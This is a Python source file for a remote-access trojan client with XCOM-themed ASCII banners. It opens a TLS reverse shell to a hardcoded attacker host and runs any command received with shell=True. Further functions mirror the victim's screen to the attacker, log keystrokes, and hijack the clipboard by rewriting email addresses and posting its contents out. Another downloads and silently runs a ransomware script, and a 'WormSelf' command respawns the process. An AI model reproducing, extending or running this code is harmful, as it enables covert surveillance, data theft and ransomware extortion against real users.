import argparse
import multiprocessing
import os,socket,subprocess
import re;
import ssl
import sys, signal
import time
#import wget
import requests
from multiprocessing import Process
import pyperclip as pc
#https://superfastpython.com/multiprocessing-in-python/
#https://superfastpython.com/kill-all-child-processes-in-python/
#https://medium.com/fintechexplained/advanced-python-how-to-use-signal-driven-programming-in-applications-84fcb722a369
#https://www.xanthium.in/operating-system-signal-handling-in-python3
#https://www.urldecoder.io/python/
##
##Server Side Post Based on
##https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7

## To implement add python Interpreter
## https://github.com/manthey/pyexe/releases
global RHOST 
global RPORT 
global RPORT_SCREEN
global ssls
global s
global processClippy
global processKeyLogger
global processKeyWorm#TODO
global processKeyRansom
global processRansom
global processCScreenShoot
global URL_CLIPPY
global Sentry
Sentry = True
def signal_handler(signal, frame):
    print("\nprogram exiting gracefully")
    sys.exit(0)
RPORT_SCREEN = 7890
signal.signal(signal.SIGINT, signal_handler)
def taskScreenShoot(RHOST):
    #https://github.com/JHLeeeMe/ssm
    import os
    import sys
    import struct
    import pickle
    import socket
    import ctypes
    from typing import Tuple

    import cv2
    import numpy as np
    from PIL import ImageGrab
    from Xlib.display import Display
    if sys.platform not in ['win32', 'linux']:
        print(f"{sys.platform} is not supported.")
        exit()


    def _screen_size() -> Tuple[int, int]:
        """Get screen size
        extract screen size in pixels
        Returns:
            width, height: Tuple[int, int]
        """
        if sys.platform == 'win32':
            try:
                ctypes.windll.user32.SetProcessDPIAware()
            except AttributeError:
                pass  # for Windows XP
            width, height = \
                ctypes.windll.user32.GetSystemMetrics(0), ctypes.windll.user32.GetSystemMetrics(1)
        else:
            from Xlib.display import Display
            display = Display(display=os.environ['DISPLAY'])
            width, height = \
                display.screen().width_in_pixels, display.screen().height_in_pixels
        return width, height


    def _mouse_position() -> Tuple[int, int]:
        """Get mouse position
        extract mouse (x, y) position
        Returns:
            coordinates: Tuple[int, int]
        """
        if sys.platform == 'win32':
            cursor = ctypes.wintypes.POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(cursor))
            return cursor.x, cursor.y
        else:
            display = Display(display=os.environ['DISPLAY'])
            coordinates = display.screen().root.query_pointer()._data
            return coordinates['root_x'], coordinates['root_y']


    class ScreenMirrorClient:
        """ScreenMirrorClient
        Attributes:
            _HOST: str
                server ip
            _PORT: int = 7890
            _QUALITY: int = 80
                encoding quality (~100)
            _CURSOR: bool = False
                mouse cursor
            _WIDTH: int
                screen x-axis size
            _HEIGHT: int
                screen y-axis size
            _client_socket: socket.socket
                socket (IPv4, TCP)
        Methods:
            start() -> None
            _send() -> None
            _get_screen() -> np.ndarray
            _encode(data: np.ndarray) -> np.ndarray
        """
        def __init__(self, host: str, port: int = 7890,
                    quality: int = 80, cursor: bool = False):
            self._HOST = host
            self._PORT = port

            self._QUALITY = quality
            self._CURSOR = cursor
            self._WIDTH, self._HEIGHT = _screen_size()

            self._client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        def start(self):
            self._client_socket.connect((self._HOST, self._PORT))

            self._send()

        def _send(self):
            """Send data to server
            1. packing & pickling screen data
            2. send data to server
            """
            try:
                while True:
                    screen = self._get_screen()
                    encoded_screen = self._encode(screen)
                    encoded_screen_pkl = pickle.dumps(encoded_screen)
                    encoded_screen_pkl_size = len(encoded_screen_pkl)

                    self._client_socket.sendall(
                        struct.pack('>III',
                                    self._WIDTH,
                                    self._HEIGHT,
                                    encoded_screen_pkl_size) + encoded_screen_pkl
                    )
            except Exception as e:
                print(e)
                print('Mirroring ends...')

        def _get_screen(self) -> np.ndarray:
            """Get screen
            extract screen with ImageGrab.grab()
            Returns:
                screen: np.ndarray
            """
            screen = np.array(ImageGrab.grab())
            if self._CURSOR:
                screen = cv2.circle(screen, _mouse_position(), 5, (0, 0, 255), -1)

            screen = cv2.cvtColor(screen, cv2.COLOR_RGB2BGR)
            return screen

        def _encode(self, data: np.ndarray) -> np.ndarray:
            """Encode screen data
            encode screen to jpg
            Args:
                data: np.ndarray
                    screen data
            Returns:
                encoded_data: np.ndarray
            """
            encode_param = (cv2.IMWRITE_JPEG_QUALITY, self._QUALITY)
            _, encoded_data = cv2.imencode(ext='.jpg',
                                        img=data,
                                        params=encode_param)
            return encoded_data

    vi=ScreenMirrorClient(RHOST,RPORT_SCREEN,80,True)
    vi.start()

def taskRansom():
    if not os.path.exists("/tmp"):
      
    # if the demo_folder directory is not present 
    # then create it.
        os.makedirs("/tmp")
    URL_CLIPPY="http://192.168.2.253:9090/RansomWindowsPOC.py"
    r = requests.get(URL_CLIPPY, allow_redirects=True)
    open('RansomWindowsPOC.py', 'wb').write(r.content)
    #s = subprocess.check_output(["AdvClipBoardClever.exe", "Hello World!"])
    proc_process = subprocess.Popen(["python","RansomWindowsPOC.py" ,"--MOTHER", "6"], shell=False,creationflags=subprocess.CREATE_NO_WINDOW)
    while True:
        if proc_process.poll() is None:
            print("Still Working!")
        else:
            ssls.send(b'''RANSOM DONE 
 _______  _______  _        _______  _______  _______   _________          _______  _______  _______    _______  _______  _______ _________ _______ _________ ______   _______ 
(  ____ )(  ___  )( (    /|(  ____ \(  ___  )(       )  \__   __/|\     /|(  ___  )(  ____ \(  ____ \  (  ____ \(  ____ \(  ____ \\__   __/(  ___  )\__   __/(  __  \ (  ____ \
| (    )|| (   ) ||  \  ( || (    \/| (   ) || () () |     ) (   | )   ( || (   ) || (    \/| (    \/  | (    \/| (    \/| (    \/   ) (   | (   ) |   ) (   | (  \  )| (    \/
| (____)|| (___) ||   \ | || (_____ | |   | || || || |     | |   | (___) || |   | || (_____ | (__      | (_____ | (__    | |         | |   | |   | |   | |   | |   ) || (_____ 
|     __)|  ___  || (\ \) |(_____  )| |   | || |(_)| |     | |   |  ___  || |   | |(_____  )|  __)     (_____  )|  __)   | |         | |   | |   | |   | |   | |   | |(_____  )
| (\ (   | (   ) || | \   |      ) || |   | || |   | |     | |   | (   ) || |   | |      ) || (              ) || (      | |         | |   | |   | |   | |   | |   ) |      ) |
| ) \ \__| )   ( || )  \  |/\____) || (___) || )   ( |     | |   | )   ( || (___) |/\____) || (____/\  /\____) || (____/\| (____/\   | |   | (___) |___) (___| (__/  )/\____) |
|/   \__/|/     \||/    )_)\_______)(_______)|/     \|     )_(   |/     \|(_______)\_______)(_______/  \_______)(_______/(_______/   )_(   (_______)\_______/(______/ \_______)

    ''')
            return 0

def taskClippy():
    dataold=""
    My_url='http://192.168.2.253'
    while True:
        
        data = pc.paste()
        if(data != dataold):

                print(data)
                dataold=data
                print(re.sub("[a-z]*@[a-z]*.[a-z]*", "idiot@tok.com", data))
                pc.copy(re.sub("[a-z]*@[a-z]*.[a-z]*", "idiot@tok.com", data))
                r = requests.post(My_url, data={'Value': data})
                

        time.sleep(2)

def task_Keylogger():
    from pynput.keyboard import Key, Listener
    import logging
    import os

    os.chdir(r"C:\\Temp")
    logging.basicConfig(filename=("BabyGroot.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    def on_press(key):
        logging.info(str(key))
    with Listener(on_press=on_press) as listener :
        listener.join() ####


# entry point
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-R", "--RHOST", type=str, required=True, action="store")
    parser.add_argument("-P", "--RPORT", type=int, required=True , action="store")
    parser.add_argument("-SH", "--SRVHOST", type=str, required=False,action="store")
    parser.add_argument("-SP", "--SRVPORT",type=int, required=False, action="store")
    parser.add_argument("-UC", "--URL_CLIPPY",type=str, required=False, action="store")
    args = parser.parse_args()
    
    RHOST= getattr(args, 'RHOST')#"192.168.2.253"
    RPORT= getattr(args, 'RPORT')#7443
    SRVHOST= "http://192.168.2.253"
    SRVPORT= 9090
    
    

    URL_CLIPPY="http://192.168.2.253:9090/AdvClipBoardCleverSignal.exe"
    valid_signals = signal.valid_signals()
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #s = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_SSLv23)
    ssls = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1_2)
    ssls.connect((RHOST,RPORT))
    ssls.send(b'''Connected 
          _______  _______  _______    _       _________          _______  _______                                                                           
|\     /|(  ____ \(  ___  )(       )  ( \      \__   __/|\     /|(  ____ \(  ____ \                                                                          
( \   / )| (    \/| (   ) || () () |  | (         ) (   | )   ( || (    \/| (    \/                                                                          
 \ (_) / | |      | |   | || || || |  | |         | |   | |   | || (__    | (_____                                                                           
  ) _ (  | |      | |   | || |(_)| |  | |         | |   ( (   ) )|  __)   (_____  )                                                                          
 / ( ) \ | |      | |   | || |   | |  | |         | |    \ \_/ / | (            ) |                                                                          
( /   \ )| (____/\| (___) || )   ( |  | (____/\___) (___  \   /  | (____/\/\____) |                                                                          
|/     \|(_______/(_______)|/     \|  (_______/\_______/   \_/   (_______/\_______)                                                                          
                                                                                                                                                             
 _______           _        _______  ______    _________          _______  _______  _______  _______    _______  _       _________ _______  _        _______ 
(  ___  )|\     /|( (    /|(  ____ \(  __  \   \__   __/|\     /|(  ___  )(  ____ \(  ____ \(  ____ \  (  ___  )( \      \__   __/(  ____ \( (    /|(  ____ \
| (   ) || )   ( ||  \  ( || (    \/| (  \  )     ) (   | )   ( || (   ) || (    \/| (    \/| (    \/  | (   ) || (         ) (   | (    \/|  \  ( || (    \/
| |   | || | _ | ||   \ | || (__    | |   ) |     | |   | (___) || |   | || (_____ | (__    | (_____   | (___) || |         | |   | (__    |   \ | || (_____ 
| |   | || |( )| || (\ \) ||  __)   | |   | |     | |   |  ___  || |   | |(_____  )|  __)   (_____  )  |  ___  || |         | |   |  __)   | (\ \) |(_____  )
| |   | || || || || | \   || (      | |   ) |     | |   | (   ) || |   | |      ) || (            ) |  | (   ) || |         | |   | (      | | \   |      ) |
| (___) || () () || )  \  || (____/\| (__/  )     | |   | )   ( || (___) |/\____) || (____/\/\____) |  | )   ( || (____/\___) (___| (____/\| )  \  |/\____) |
(_______)(_______)|/    )_)(_______/(______/      )_(   |/     \|(_______)\_______)(_______/\_______)  |/     \|(_______/\_______/(_______/|/    )_)\_______)
                                                                                                                                                                
                                                    
            
    byebye to quit. But the sectoids will control you mind.
    ''')    
    ssls.send(str.encode(os. getcwd()+">"))
    while True :
        data= ssls.recv(2048)
        print(str(data,"utf-8"))
        if(str(data,"utf-8")== 'byebye\n'):
            ssls.send(b'''Connected 
            XCOM will back soon   
                                                                
    $$\   $$\  $$$$$$\   $$$$$$\  $$\      $$\       
    $$ |  $$ |$$  __$$\ $$  __$$\ $$$\    $$$ |      
    \$$\ $$  |$$ /  \__|$$ /  $$ |$$$$\  $$$$ |      
    \$$$$  / $$ |      $$ |  $$ |$$\$$\$$ $$ |      
    $$  $$<  $$ |      $$ |  $$ |$$ \$$$  $$ |      
    $$  /\$$\ $$ |  $$\ $$ |  $$ |$$ |\$  /$$ |      
    $$ /  $$ |\$$$$$$  | $$$$$$  |$$ | \_/ $$ |      
    \__|  \__| \______/  \______/ \__|     \__|    
                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                                                                                                                                     
XXXXXXX       XXXXXXX       CCCCCCCCCCCCC     OOOOOOOOO     MMMMMMMM               MMMMMMMM     WWWWWWWW                           WWWWWWWWIIIIIIIIIILLLLLLLLLLL             LLLLLLLLLLL                  NNNNNNNN        NNNNNNNNEEEEEEEEEEEEEEEEEEEEEEVVVVVVVV           VVVVVVVVEEEEEEEEEEEEEEEEEEEEEERRRRRRRRRRRRRRRRR        DDDDDDDDDDDDD      IIIIIIIIIIEEEEEEEEEEEEEEEEEEEEEE
X:::::X       X:::::X    CCC::::::::::::C   OO:::::::::OO   M:::::::M             M:::::::M     W::::::W                           W::::::WI::::::::IL:::::::::L             L:::::::::L                  N:::::::N       N::::::NE::::::::::::::::::::EV::::::V           V::::::VE::::::::::::::::::::ER::::::::::::::::R       D::::::::::::DDD   I::::::::IE::::::::::::::::::::E
X:::::X       X:::::X  CC:::::::::::::::C OO:::::::::::::OO M::::::::M           M::::::::M     W::::::W                           W::::::WI::::::::IL:::::::::L             L:::::::::L                  N::::::::N      N::::::NE::::::::::::::::::::EV::::::V           V::::::VE::::::::::::::::::::ER::::::RRRRRR:::::R      D:::::::::::::::DD I::::::::IE::::::::::::::::::::E
X::::::X     X::::::X C:::::CCCCCCCC::::CO:::::::OOO:::::::OM:::::::::M         M:::::::::M     W::::::W                           W::::::WII::::::IILL:::::::LL             LL:::::::LL                  N:::::::::N     N::::::NEE::::::EEEEEEEEE::::EV::::::V           V::::::VEE::::::EEEEEEEEE::::ERR:::::R     R:::::R     DDD:::::DDDDD:::::DII::::::IIEE::::::EEEEEEEEE::::E
XXX:::::X   X:::::XXXC:::::C       CCCCCCO::::::O   O::::::OM::::::::::M       M::::::::::M      W:::::W           WWWWW           W:::::W   I::::I    L:::::L                 L:::::L                    N::::::::::N    N::::::N  E:::::E       EEEEEE V:::::V           V:::::V   E:::::E       EEEEEE  R::::R     R:::::R       D:::::D    D:::::D I::::I    E:::::E       EEEEEE
   X:::::X X:::::X  C:::::C              O:::::O     O:::::OM:::::::::::M     M:::::::::::M       W:::::W         W:::::W         W:::::W    I::::I    L:::::L                 L:::::L                    N:::::::::::N   N::::::N  E:::::E               V:::::V         V:::::V    E:::::E               R::::R     R:::::R       D:::::D     D:::::DI::::I    E:::::E             
    X:::::X:::::X   C:::::C              O:::::O     O:::::OM:::::::M::::M   M::::M:::::::M        W:::::W       W:::::::W       W:::::W     I::::I    L:::::L                 L:::::L                    N:::::::N::::N  N::::::N  E::::::EEEEEEEEEE      V:::::V       V:::::V     E::::::EEEEEEEEEE     R::::RRRRRR:::::R        D:::::D     D:::::DI::::I    E::::::EEEEEEEEEE   
     X:::::::::X    C:::::C              O:::::O     O:::::OM::::::M M::::M M::::M M::::::M         W:::::W     W:::::::::W     W:::::W      I::::I    L:::::L                 L:::::L                    N::::::N N::::N N::::::N  E:::::::::::::::E       V:::::V     V:::::V      E:::::::::::::::E     R:::::::::::::RR         D:::::D     D:::::DI::::I    E:::::::::::::::E   
     X:::::::::X    C:::::C              O:::::O     O:::::OM::::::M  M::::M::::M  M::::::M          W:::::W   W:::::W:::::W   W:::::W       I::::I    L:::::L                 L:::::L                    N::::::N  N::::N:::::::N  E:::::::::::::::E        V:::::V   V:::::V       E:::::::::::::::E     R::::RRRRRR:::::R        D:::::D     D:::::DI::::I    E:::::::::::::::E   
    X:::::X:::::X   C:::::C              O:::::O     O:::::OM::::::M   M:::::::M   M::::::M           W:::::W W:::::W W:::::W W:::::W        I::::I    L:::::L                 L:::::L                    N::::::N   N:::::::::::N  E::::::EEEEEEEEEE         V:::::V V:::::V        E::::::EEEEEEEEEE     R::::R     R:::::R       D:::::D     D:::::DI::::I    E::::::EEEEEEEEEE   
   X:::::X X:::::X  C:::::C              O:::::O     O:::::OM::::::M    M:::::M    M::::::M            W:::::W:::::W   W:::::W:::::W         I::::I    L:::::L                 L:::::L                    N::::::N    N::::::::::N  E:::::E                    V:::::V:::::V         E:::::E               R::::R     R:::::R       D:::::D     D:::::DI::::I    E:::::E             
XXX:::::X   X:::::XXXC:::::C       CCCCCCO::::::O   O::::::OM::::::M     MMMMM     M::::::M             W:::::::::W     W:::::::::W          I::::I    L:::::L         LLLLLL  L:::::L         LLLLLL     N::::::N     N:::::::::N  E:::::E       EEEEEE        V:::::::::V          E:::::E       EEEEEE  R::::R     R:::::R       D:::::D    D:::::D I::::I    E:::::E       EEEEEE
X::::::X     X::::::X C:::::CCCCCCCC::::CO:::::::OOO:::::::OM::::::M               M::::::M              W:::::::W       W:::::::W         II::::::IILL:::::::LLLLLLLLL:::::LLL:::::::LLLLLLLLL:::::L     N::::::N      N::::::::NEE::::::EEEEEEEE:::::E         V:::::::V         EE::::::EEEEEEEE:::::ERR:::::R     R:::::R     DDD:::::DDDDD:::::DII::::::IIEE::::::EEEEEEEE:::::E
X:::::X       X:::::X  CC:::::::::::::::C OO:::::::::::::OO M::::::M               M::::::M               W:::::W         W:::::W          I::::::::IL::::::::::::::::::::::LL::::::::::::::::::::::L     N::::::N       N:::::::NE::::::::::::::::::::E          V:::::V          E::::::::::::::::::::ER::::::R     R:::::R     D:::::::::::::::DD I::::::::IE::::::::::::::::::::E
X:::::X       X:::::X    CCC::::::::::::C   OO:::::::::OO   M::::::M               M::::::M                W:::W           W:::W           I::::::::IL::::::::::::::::::::::LL::::::::::::::::::::::L     N::::::N        N::::::NE::::::::::::::::::::E           V:::V           E::::::::::::::::::::ER::::::R     R:::::R     D::::::::::::DDD   I::::::::IE::::::::::::::::::::E
XXXXXXX       XXXXXXX       CCCCCCCCCCCCC     OOOOOOOOO     MMMMMMMM               MMMMMMMM                 WWW             WWW            IIIIIIIIIILLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL     NNNNNNNN         NNNNNNNEEEEEEEEEEEEEEEEEEEEEE            VVV            EEEEEEEEEEEEEEEEEEEEEERRRRRRRR     RRRRRRR     DDDDDDDDDDDDD      IIIIIIIIIIEEEEEEEEEEEEEEEEEEEEEE
                                                                                                                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                                                                                                                     
                                  
            ''')
            ssls.close()
            exit()
        if(str(data,"utf-8")== 'ClippyON\n'):
            """
            r = requests.get(URL_CLIPPY, allow_redirects=True)
            open('AdvClipBoardCleverSignal.exe', 'wb').write(r.content)
            #s = subprocess.check_output(["AdvClipBoardClever.exe", "Hello World!"])
            processClippy = subprocess.Popen("AdvClipBoardCleverSignal.exe", stdout=subprocess.PIPE, stderr=subprocess.STDOUT,universal_newlines=True,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
            os.kill(processClippy.pid, signal.SIGINT)
            os.k
            """
            processClippy = Process(target=taskClippy)
            processClippy.start()
            ssls.send(str.encode(os. getcwd()+">"))
        elif (str(data,"utf-8")== 'ClippyOFF\n'):
            processClippy = Process(target=taskClippy)
            processClippy.start()
        elif (str(data,"utf-8")== 'CreapyON\n'):
            processCScreenShoot = Process(target=taskScreenShoot,args=[RHOST])
            processCScreenShoot.start()
        
        elif (str(data,"utf-8")== 'CreapyOFF\n'):
            processCScreenShoot.kill()
            ssls.send(str.encode(os. getcwd()+">"))
        elif(str(data,"utf-8")== 'KeyloggerON\n'):
            processKeyLogger = Process(target=task_Keylogger)
            processKeyLogger.start()
            ssls.send(str.encode(os. getcwd()+">"))
        elif(str(data,"utf-8")== 'KeyloggerOFF\n'):
            processKeyLogger.kill()
            ssls.send(str.encode(os. getcwd()+">"))
        elif(str(data,"utf-8")== 'WormSelf\n'):
            RPORTNew = RPORT +1
            proc_process = subprocess.Popen(["python",__file__ ,"--RHOST", "192.168.2.253", "--RPORT",str(RPORTNew)], shell=False,creationflags=subprocess.CREATE_NO_WINDOW)
            
            ssls.send(str.encode(os. getcwd()+">"))
        elif(str(data,"utf-8")== 'RansomOn\n'):
            
            processKeyRansom = Process(target=taskRansom)
            ssls.send(str.encode(os. getcwd()+">"))
        elif (data[:2]== 'cd'):
            if (os.path.exists(str(data[:3]).replace('\n',''))):
                os.chdir(str(data[:3]).replace('\n',''))
                ssls.send(str.encode(os. getcwd()+">"))
        elif (data== '\n'):
                ssls.send(str.encode(os. getcwd()+">"))
        else:
            process =subprocess.Popen(str(data,"utf-8"), shell= True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
            out = process.stdout.read()+process.stderr.read()
            ssls.send(out)
            ssls.send(str.encode(os. getcwd()+">"))

    #process.stdout.read()+ process.stderr.read()




